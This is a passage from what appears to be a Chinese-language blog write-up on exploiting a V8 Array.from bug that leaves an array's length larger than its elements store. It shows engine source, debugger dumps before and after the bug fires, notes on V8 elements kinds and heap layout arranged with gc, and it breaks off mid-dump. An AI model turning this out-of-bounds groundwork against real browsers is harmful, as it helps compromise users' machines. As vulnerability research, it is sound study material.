<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 22.1.2.1 Array.from ( items [ , mapfn [ , thisArg ] ] )</span></span><br><span class="line">define(</span><br><span class="line">  <span class="built_in">Array</span>, <span class="string">'from'</span>,</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">from</span>(<span class="params">items</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> mapfn = <span class="built_in">arguments</span>[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">var</span> thisArg = <span class="built_in">arguments</span>[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> c = strict(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">if</span> (mapfn === <span class="literal">undefined</span>) &#123;</span><br><span class="line">      <span class="keyword">var</span> mapping = <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (!IsCallable(mapfn)) <span class="keyword">throw</span> <span class="built_in">TypeError</span>();</span><br><span class="line">      <span class="keyword">var</span> t = thisArg;</span><br><span class="line">      mapping = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> usingIterator = GetMethod(items, $$iterator);</span><br><span class="line">    <span class="keyword">if</span> (usingIterator !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">       <span class="keyword">if</span> (IsConstructor(c)) &#123;</span><br><span class="line">        <span class="keyword">var</span> a = <span class="keyword">new</span> c();</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        a = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">var</span> iterator = GetIterator(items, usingIterator);</span><br><span class="line">      <span class="keyword">var</span> k = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> next = IteratorStep(iterator);</span><br><span class="line">        <span class="keyword">if</span> (next === <span class="literal">false</span>) &#123;</span><br><span class="line">          a.length = k;</span><br><span class="line">          <span class="keyword">return</span> a;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> nextValue = IteratorValue(next);</span><br><span class="line">        <span class="keyword">if</span> (mapping)</span><br><span class="line">          <span class="keyword">var</span> mappedValue = mapfn.call(t, nextValue);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          mappedValue = nextValue;</span><br><span class="line">        a[k] = mappedValue;</span><br><span class="line">        k += <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> arrayLike = ToObject(items);</span><br><span class="line">    <span class="keyword">var</span> lenValue = arrayLike.length;</span><br><span class="line">    <span class="keyword">var</span> len = ToLength(lenValue);</span><br><span class="line">    <span class="keyword">if</span> (IsConstructor(c)) &#123; <span class="comment">//here</span></span><br><span class="line">      a = <span class="keyword">new</span> c(len);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      a = <span class="keyword">new</span> <span class="built_in">Array</span>(len);</span><br><span class="line">    &#125;</span><br><span class="line">    k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (k &lt; len) &#123;</span><br><span class="line">      <span class="keyword">var</span> kValue = arrayLike[k];</span><br><span class="line">      <span class="keyword">if</span> (mapping)</span><br><span class="line">        mappedValue = mapfn.call(t, kValue, k);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        mappedValue = kValue;</span><br><span class="line">      a[k] = mappedValue;</span><br><span class="line">      k += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    a.length = len;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>
<h5 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h5><p>目标bin是32位的，checkout过去之后很多依赖也要装32位的，我这里就用64位的binary做了</p>
<h5 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><p>搭完环境之后先测下PoC，成功在release的d8上产生了崩溃。我们将poc里的max减成2000加快运行速度，漏洞触发前后分别下断点调试。</p>
<p>触发漏洞之后length变为了1999而elements还是长度为0的<code>FixedArray</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">//before</span><br><span class="line">DebugPrint: 0xd92ff8d8b1: [JSArray]</span><br><span class="line"> - map: 0x9d2b9b02571 &lt;Map(PACKED_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x400cb585539 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x239fe7482251 &lt;FixedArray[0]&gt; [PACKED_SMI_ELEMENTS]</span><br><span class="line"> - length: 0</span><br><span class="line"> - properties: 0x239fe7482251 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    <span class="comment">#length: 0x239fe74cff89 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"> &#125;</span><br><span class="line">0x9d2b9b02571: [Map]</span><br><span class="line"> - <span class="built_in">type</span>: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: 32</span><br><span class="line"> - inobject properties: 0</span><br><span class="line"> - elements kind: PACKED_SMI_ELEMENTS</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - back pointer: 0x239fe74822e1 &lt;undefined&gt;</span><br><span class="line"> - prototype_validity cell: 0x239fe7482629 &lt;Cell value= 1&gt;</span><br><span class="line"> - instance descriptors (own) <span class="comment">#1: 0x400cb5857e9 &lt;DescriptorArray[5]&gt;</span></span><br><span class="line"> - layout descriptor: (nil)</span><br><span class="line"> - transitions <span class="comment">#1: 0x400cb5856a9 &lt;TransitionArray[4]&gt;Transition array #1:</span></span><br><span class="line">     0x239fe74cf7d9 &lt;Symbol: (elements_transition_symbol)&gt;: (transition to HOLEY_SMI_ELEMENTS) -&gt; 0x9d2b9b02621 &lt;Map(HOLEY_SMI_ELEMENTS)&gt;</span><br><span class="line"></span><br><span class="line"> - prototype: 0x400cb585539 &lt;JSArray[0]&gt;</span><br><span class="line"> - constructor: 0x400cb585179 &lt;JSFunction Array (sfi = 0x239fe74ba641)&gt;</span><br><span class="line"> - dependent code: 0x239fe7482251 &lt;FixedArray[0]&gt;</span><br><span class="line"> - construction counter: 0</span><br><span class="line">//after</span><br><span class="line">DebugPrint: 0xd92ff8d8b1: [JSArray]</span><br><span class="line"> - map: 0x9d2b9b02571 &lt;Map(PACKED_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x400cb585539 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x239fe7482251 &lt;FixedArray[0]&gt; [PACKED_SMI_ELEMENTS]</span><br><span class="line"> - length: 1999</span><br><span class="line"> - properties: 0x239fe7482251 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    <span class="comment">#length: 0x239fe74cff89 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"> &#125;</span><br><span class="line">0x9d2b9b02571: [Map]</span><br><span class="line"> - <span class="built_in">type</span>: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: 32</span><br><span class="line"> - inobject properties: 0</span><br><span class="line"> - elements kind: PACKED_SMI_ELEMENTS</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - back pointer: 0x239fe74822e1 &lt;undefined&gt;</span><br><span class="line"> - prototype_validity cell: 0x239fe7482629 &lt;Cell value= 1&gt;</span><br><span class="line"> - instance descriptors (own) <span class="comment">#1: 0x400cb5857e9 &lt;DescriptorArray[5]&gt;</span></span><br><span class="line"> - layout descriptor: (nil)</span><br><span class="line"> - transitions <span class="comment">#1: 0x400cb5856a9 &lt;TransitionArray[4]&gt;Transition array #1:</span></span><br><span class="line">     0x239fe74cf7d9 &lt;Symbol: (elements_transition_symbol)&gt;: (transition to HOLEY_SMI_ELEMENTS) -&gt; 0x9d2b9b02621 &lt;Map(HOLEY_SMI_ELEMENTS)&gt;</span><br><span class="line"></span><br><span class="line"> - prototype: 0x400cb585539 &lt;JSArray[0]&gt;</span><br><span class="line"> - constructor: 0x400cb585179 &lt;JSFunction Array (sfi = 0x239fe74ba641)&gt;</span><br><span class="line"> - dependent code: 0x239fe7482251 &lt;FixedArray[0]&gt;</span><br><span class="line"> - construction counter: 0</span><br></pre></td></tr></table></figure>
<h5 id="elements"><a href="#elements" class="headerlink" title="elements"></a>elements</h5><p>参考<a href="https://v8.dev/blog/elements-kinds" target="_blank" rel="noopener">Elements kinds in V8</a>了解v8中elements的概念.我们在js层看到的<code>integer/float/double</code>都属于<code>number</code>，而在engine层，需要做更细粒度的区分用于优化。</p>
<p>如下面的两种类型的elements</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> array = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="comment">// elements kind: PACKED_SMI_ELEMENTS</span></span><br><span class="line">array.push(<span class="number">4.56</span>);</span><br><span class="line"><span class="comment">// elements kind: PACKED_DOUBLE_ELEMENTS</span></span><br></pre></td></tr></table></figure>
<p>elements总是单向的转换到更为普适的类型。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> array = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="comment">// elements kind: PACKED_SMI_ELEMENTS</span></span><br><span class="line">array.push(<span class="number">4.56</span>);</span><br><span class="line"><span class="comment">// elements kind: PACKED_DOUBLE_ELEMENTS</span></span><br><span class="line">array.push(<span class="string">'x'</span>);</span><br><span class="line"><span class="comment">// elements kind: PACKED_ELEMENTS</span></span><br></pre></td></tr></table></figure>
<p>上面看到的array都是<code>packed arrays</code>，在array中制造出一个hole出来使得elements降级为<code>holey</code>类型。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> array = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4.56</span>, <span class="string">'x'</span>];</span><br><span class="line"><span class="comment">// elements kind: PACKED_ELEMENTS</span></span><br><span class="line">array.length; <span class="comment">// 5</span></span><br><span class="line">array[<span class="number">9</span>] = <span class="number">1</span>; <span class="comment">// array[5] until array[8] are now holes</span></span><br><span class="line"><span class="comment">// elements kind: HOLEY_ELEMENTS</span></span><br></pre></td></tr></table></figure>
<p><img src="/2021/05/13/v8-basic/51.png" alt></p>
<p>下面是目前v8支持的element类型。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> ElementsKind &#123;</span><br><span class="line">  <span class="comment">// The "fast" kind for elements that only contain SMI values. Must be first</span></span><br><span class="line">  <span class="comment">// to make it possible to efficiently check maps for this kind.</span></span><br><span class="line">  PACKED_SMI_ELEMENTS,</span><br><span class="line">  HOLEY_SMI_ELEMENTS,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// The "fast" kind for tagged values. Must be second to make it possible to</span></span><br><span class="line">  <span class="comment">// efficiently check maps for this and the PACKED_SMI_ELEMENTS kind</span></span><br><span class="line">  <span class="comment">// together at once.</span></span><br><span class="line">  PACKED_ELEMENTS,</span><br><span class="line">  HOLEY_ELEMENTS,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// The "fast" kind for unwrapped, non-tagged double values.</span></span><br><span class="line">  PACKED_DOUBLE_ELEMENTS,</span><br><span class="line">  HOLEY_DOUBLE_ELEMENTS,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// The "slow" kind.</span></span><br><span class="line">  DICTIONARY_ELEMENTS,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Elements kind of the "arguments" object (only in sloppy mode).</span></span><br><span class="line">  FAST_SLOPPY_ARGUMENTS_ELEMENTS,</span><br><span class="line">  SLOW_SLOPPY_ARGUMENTS_ELEMENTS,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// For string wrapper objects ("new String('...')"), the string's characters</span></span><br><span class="line">  <span class="comment">// are overlaid onto a regular elements backing store.</span></span><br><span class="line">  FAST_STRING_WRAPPER_ELEMENTS,</span><br><span class="line">  SLOW_STRING_WRAPPER_ELEMENTS,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Fixed typed arrays.</span></span><br><span class="line">  UINT8_ELEMENTS,</span><br><span class="line">  INT8_ELEMENTS,</span><br><span class="line">  UINT16_ELEMENTS,</span><br><span class="line">  INT16_ELEMENTS,</span><br><span class="line">  UINT32_ELEMENTS,</span><br><span class="line">  INT32_ELEMENTS,</span><br><span class="line">  FLOAT32_ELEMENTS,</span><br><span class="line">  FLOAT64_ELEMENTS,</span><br><span class="line">  UINT8_CLAMPED_ELEMENTS,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Sentinel ElementsKind for objects with no elements.</span></span><br><span class="line">  NO_ELEMENTS,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Derived constants from ElementsKind.</span></span><br><span class="line">  FIRST_ELEMENTS_KIND = PACKED_SMI_ELEMENTS,</span><br><span class="line">  LAST_ELEMENTS_KIND = UINT8_CLAMPED_ELEMENTS,</span><br><span class="line">  FIRST_FAST_ELEMENTS_KIND = PACKED_SMI_ELEMENTS,</span><br><span class="line">  LAST_FAST_ELEMENTS_KIND = HOLEY_DOUBLE_ELEMENTS,</span><br><span class="line">  FIRST_FIXED_TYPED_ARRAY_ELEMENTS_KIND = UINT8_ELEMENTS,</span><br><span class="line">  LAST_FIXED_TYPED_ARRAY_ELEMENTS_KIND = UINT8_CLAMPED_ELEMENTS,</span><br><span class="line">  TERMINAL_FAST_ELEMENTS_KIND = HOLEY_ELEMENTS</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h5><p>我看了下之前OOB的题目笔记，发现<code>elements</code>和<code>obj</code>的位置天然相近，当时做题的时候还以为是固定的layout，但是在这个issue调试时发现并非如此。首先我们降低max的值加快运行速度，之后发现假使我们以下面的方式布置arr，最终的结果是<code>elements</code>和<code>obj</code>相距甚远。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">DebugPrint: 0x2469c92fbdb1: [JSArray]</span><br><span class="line"> - map: 0x92cf4482679 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x1f1f1ba05539 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0xcc3e540f059 &lt;FixedDoubleArray[1]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 999</span><br><span class="line"> - properties: 0x1f2e23082251 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    <span class="comment">#length: 0x1f2e230cff89 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0xcc3e540f059 &lt;FixedDoubleArray[1]&gt; &#123;</span><br><span class="line">           0: 0</span><br><span class="line"> &#125;</span><br><span class="line">0x92cf4482679: [Map]</span><br><span class="line"> - <span class="built_in">type</span>: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: 32</span><br><span class="line"> - inobject properties: 0</span><br><span class="line"> - elements kind: PACKED_DOUBLE_ELEMENTS</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - back pointer: 0x92cf4482621 &lt;Map(HOLEY_SMI_ELEMENTS)&gt;</span><br><span class="line"> - prototype_validity cell: 0x1f2e23082629 &lt;Cell value= 1&gt;</span><br><span class="line"> - instance descriptors <span class="comment">#1: 0x1f1f1ba057e9 &lt;DescriptorArray[5]&gt;</span></span><br><span class="line"> - layout descriptor: (nil)</span><br><span class="line"> - transitions <span class="comment">#1: 0x1f1f1ba05729 &lt;TransitionArray[4]&gt;Transition array #1:</span></span><br><span class="line">     0x1f2e230cf7d9 &lt;Symbol: (elements_transition_symbol)&gt;: (transition to HOLEY_DOUBLE_ELEMENTS) -&gt; 0x92cf44826d1 &lt;Map(HOLEY_DOUBLE_ELEMENTS)&gt;</span><br><span class="line"></span><br><span class="line"> - prototype: 0x1f1f1ba05539 &lt;JSArray[0]&gt;</span><br><span class="line"> - constructor: 0x1f1f1ba05179 &lt;JSFunction Array (sfi = 0x1f2e230ba641)&gt;</span><br><span class="line"> - dependent code: 0x1f2e23082251 &lt;FixedArray[0]&gt;</span><br><span class="line"> - construction counter: 0</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = &#123;<span class="string">"a"</span>:<span class="string">"1"</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> oobArray = [<span class="number">3.1</span>];</span><br><span class="line"><span class="keyword">var</span> double_arr = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>];</span><br><span class="line"><span class="keyword">var</span> obj_arr = [a];</span><br><span class="line"><span class="comment">//Array.from ...</span></span><br></pre></td></tr></table></figure>
<p>联想一下之前看gc的时候说gc会使得obj移入old space，从而对象布局相对固定。那么我们先gc，再分配arr，调整max的值为50，发现此时elements和obj离得没那么远了，但是相应地，我们调整max的值，distance也会相应增大或者减小。再从gdb里看下数据，可以发现elements往后是拷贝的迭代器的值。到这里我们基本可以确定了，在<code>Array.from</code>进行数组拷贝时我们将迭代器的值拷贝到了elements所在的空间，因此虽然length改掉了，但是这块空间没有被回收，整个空间布局是<code>oobArr-&gt;unrecovered space-&gt;double_arr-&gt;obj_arr</code>。因此我们可以在分配后两个对象前先gc回收掉这块区域，从而布置arr到我们可以访问的范围。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gc()</span><br><span class="line"><span class="keyword">var</span> a = &#123;<span class="string">"a"</span>:<span class="string">"1"</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> oobArray = [<span class="number">3.1</span>];</span><br><span class="line"><span class="keyword">var</span> double_arr = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>];</span><br><span class="line"><span class="keyword">var</span> obj_arr = [a];</span><br><span class="line"><span class="comment">//Array.from ... (max=50)</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">DebugPrint: 0x2f429437bdb1: [JSArray]</span><br><span class="line"> - map: 0x1bd4e302679 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x367ae2a85539 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x2f429437d059 &lt;FixedDoubleArray[1]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 49</span><br><span class="line"> - properties: 0x3bf6a8582251 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    <span class="comment">#length: 0x3bf6a85cff89 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x2f429437d059 &lt;FixedDoubleArray[1]&gt; &#123;</span><br><span class="line">           0: 0</span><br><span class="line"> &#125;</span><br><span class="line">0x1bd4e302679: [Map]</span><br><span class="line"> - <span class="built_in">type</span>: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: 32</span><br><span class="line"> - inobject properties: 0</span><br><span class="line"> - elements kind: PACKED_DOUBLE_ELEMENTS</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - back pointer: 0x1bd4e302621 &lt;Map(HOLEY_SMI_ELEMENTS)&gt;</span><br><span class="line"> - prototype_validity cell: 0x3bf6a8582629 &lt;Cell value= 1&gt;</span><br><span class="line"> - instance descriptors <span class="comment">#1: 0x367ae2a857e9 &lt;DescriptorArray[5]&gt;</span></span><br><span class="line"> - layout descriptor: (nil)</span><br><span class="line"> - transitions <span class="comment">#1: 0x367ae2a85729 &lt;TransitionArray[4]&gt;Transition array #1:</span></span><br><span class="line">     0x3bf6a85cf7d9 &lt;Symbol: (elements_transition_symbol)&gt;: (transition to HOLEY_DOUBLE_ELEMENTS) -&gt; 0x1bd4e3026d1 &lt;Map(HOLEY_DOUBLE_ELEMENTS)&gt;</span><br><span class="line"></span><br><span class="line"> - prototype: 0x367ae2a85539 &lt;JSArray[0]&gt;</span><br><span class="line"> - constructor: 0x367ae2a85179 &lt;JSFunction Array (sfi = 0x3bf6a85ba641)&gt;</span><br><span class="line"> - dependent code: 0x3bf6a8582251 &lt;FixedArray[0]&gt;</span><br><span class="line"> - construction counter: 0</span><br><span class="line"> gdb-peda$ distance 0x2f429437bdb1 0x2f429437d059</span><br><span class="line">From 0x2f429437bdb1 to 0x2f429437d059: 4776 bytes, 1194 dwords</span><br><span class="line">gdb-peda$ telescope 0x2f429437d059-1 100</span><br><span class="line">0000| 0x2f429437d058 --&gt; 0xccc409032d9 --&gt; 0xccc409022 </span><br><span class="line">0008| 0x2f429437d060 --&gt; 0x100000000 </span><br><span class="line">0016| 0x2f429437d068 --&gt; 0x0 </span><br><span class="line">0024| 0x2f429437d070 --&gt; 0xccc40902201 --&gt; 0xccc409022 </span><br><span class="line">0032| 0x2f429437d078 --&gt; 0x2a800000000 </span><br><span class="line">0040| 0x2f429437d080 --&gt; 0x4008000000000000 </span><br><span class="line">0048| 0x2f429437d088 --&gt; 0x4010000000000000 </span><br><span class="line">0056| 0x2f429437d090 --&gt; 0x4014000000000000 </span><br><span class="line">0064| 0x2f429437d098 --&gt; 0x4018000000000000 </span><br><span class="line">0072| 0x2f429437d0a0 --&gt; 0x401c000000000000 </span><br><span class="line">0080| 0x2f429437d0a8 --&gt; 0x4020000000000000 (<span class="string">''</span>)</span><br><span class="line">0088| 0x2f429437d0b0 --&gt; 0x4022000000000000 (<span class="string">''</span>)</span><br><span class="line">0096| 0x2f429437d0b8 --&gt; 0x4024000000000000 (<span class="string">''</span>)</span><br><span class="line">0104| 0x2f429437d0c0 --&gt; 0x4026000000000000 (<span class="string">''</span>)</span><br><span class="line">0112| 0x2f429437d0c8 --&gt; 0x4028000000000000 (<span class="string">''</span>)</span><br><span class="line">0120| 0x2f429437d0d0 --&gt; 0x402a000000000000 (<span class="string">''</span>)</span><br><span class="line">0128| 0x2f429437d0d8 --&gt; 0x402c000000000000 (<span class="string">''</span>)</span><br><span class="line">0136| 0x2f429437d0e0 --&gt; 0x402e000000000000 (<span class="string">''</span>)</span><br><span class="line">0144| 0x2f429437d0e8 --&gt; 0x4030000000000000 (<span class="string">''</span>)</span><br><span class="line">0152| 0x2f429437d0f0 --&gt; 0x4031000000000000 (<span class="string">''</span>)</span><br><span class="line">0160| 0x2f429437d0f8 --&gt; 0x4032000000000000 (<span class="string">''</span>)</span><br><span class="line">0168| 0x2f429437d100 --&gt; 0x4033000000000000 (<span class="string">''</span>)</span><br><span class="line">0176| 0x2f429437d108 --&gt; 0x4034000000000000 (<span class="string">''</span>)</span><br><span class="line">0184| 0x2f429437d110 --&gt; 0x4035000000000000 (<span class="string">''</span>)</span><br><span class="line">0192| 0x2f429437d118 --&gt; 0x4036000000000000 (<span class="string">''</span>)</span><br><span 